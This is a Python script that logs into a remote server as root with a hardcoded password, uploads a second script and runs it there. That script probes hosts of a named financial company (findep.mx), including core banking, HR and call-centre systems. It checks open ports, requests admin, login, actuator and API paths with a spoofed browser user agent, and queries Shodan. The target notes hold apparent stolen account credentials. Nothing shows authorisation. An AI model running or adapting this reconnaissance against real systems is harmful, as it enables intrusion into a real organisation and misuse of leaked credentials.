import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, socket
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

targets = {
    "universidad.findep.mx": {
        "ip": "162.222.177.92",
        "ports": [80, 443],
        "paths": ["/", "/login/index.php", "/admin/", "/lib/", "/moodle/", "/user/login.php",
                  "/course/view.php?id=1", "/admin/settings.php", "/theme/", "/local/"],
        "note": "Moodle - NON-GCP - creds: Fisa1234*"
    },
    "portafolio.findep.mx": {
        "ip": "34.107.195.10",
        "ports": [80, 443],
        "paths": ["/", "/share/", "/alfresco/", "/share/page/", "/alfresco/api/-default-/public/alfresco/versions/1/nodes",
                  "/alfresco/webdav/", "/alfresco/s/api/login", "/share/page/site-index",
                  "/share/proxy/alfresco/api/", "/alfresco/s/api/people"],
        "note": "Alfresco - GCP - cred: Jjaimesva:Igual2020*"
    },
    "sif.findep.mx": {
        "ip": "34.110.220.98",
        "ports": [80, 443],
        "paths": ["/", "/login", "/inicio.jsp", "/restaurarPassword.jsp",
                  "/actuator/health", "/actuator/env", "/swagger-ui/"],
        "note": "SIF - GCP NEW IP"
    },
    "core.findep.mx": {
        "ip": "35.188.27.26",
        "ports": [80, 443, 8080],
        "paths": ["/", "/login.do", "/index.do", "/struts/", "/actuator/health"],
        "note": "Core banking Struts"
    },
    "aheeva.findep.mx": {
        "ip": "35.184.90.104",
        "ports": [80, 443, 5443, 9443],
        "paths": ["/", "/login", "/agent/", "/admin/"],
        "note": "Aheeva call center"
    },
    "ppp.findep.mx": {
        "ip": "35.225.39.206",
        "ports": [80, 443],
        "paths": ["/", "/khorLogin.asp", "/login.asp", "/default.asp"],
        "note": "HR ASP legacy"
    },
}

for host, cfg in targets.items():
    sys.stdout.write(f"\n{'='*60}\n=== {host} ({cfg['ip']}) - {cfg['note']} ===\n{'='*60}\n")
    sys.stdout.flush()

    # TCP check first
    for port in cfg["ports"]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            result = s.connect_ex((cfg["ip"], port))
            s.close()
            state = "OPEN" if result == 0 else "CLOSED"
            sys.stdout.write(f"  TCP:{port} = {state}\n")
        except:
            sys.stdout.write(f"  TCP:{port} = ERR\n")
        sys.stdout.flush()

    # HTTP probe
    for path in cfg["paths"]:
        for port in cfg["ports"]:
            proto = "https" if port in (443, 5443, 9443) else "http"
            url = f"{proto}://{cfg['ip']}:{port}{path}"
            try:
                r = requests.get(url,
                    headers={"Host": host, "User-Agent": UA, "Accept": "text/html,application/json,*/*"},
                    timeout=5, verify=False, allow_redirects=False)
                tag = ""
                if r.status_code == 200 and len(r.text) > 50:
                    tag = " *** HIT ***"
                elif r.status_code in (301, 302):
                    tag = f" -> {r.headers.get('Location', '?')[:100]}"
                srv = r.headers.get("Server", "")
                xpow = r.headers.get("X-Powered-By", "")
                extra = f" Srv={srv}" if srv else ""
                extra += f" XPB={xpow}" if xpow else ""
                sys.stdout.write(f"  [{r.status_code}] {proto}:{port}{path} ({len(r.text)}b){tag}{extra}\n")
                if tag == " *** HIT ***":
                    sys.stdout.write(f"    BODY: {repr(r.text[:400])}\n")
                sys.stdout.flush()
            except requests.exceptions.ConnectTimeout:
                pass
            except requests.exceptions.ConnectionError:
                pass
            except Exception as e:
                sys.stdout.write(f"  [ERR] {proto}:{port}{path}: {e}\n")
                sys.stdout.flush()

# InternetDB for non-GCP universidad
sys.stdout.write(f"\n=== InternetDB 162.222.177.92 ===\n")
try:
    r = requests.get("https://internetdb.shodan.io/162.222.177.92", timeout=5)
    sys.stdout.write(f"  {r.text}\n")
except Exception as e:
    sys.stdout.write(f"  ERR: {e}\n")
sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/probe_findep.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/probe_findep.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Done.', flush=True)
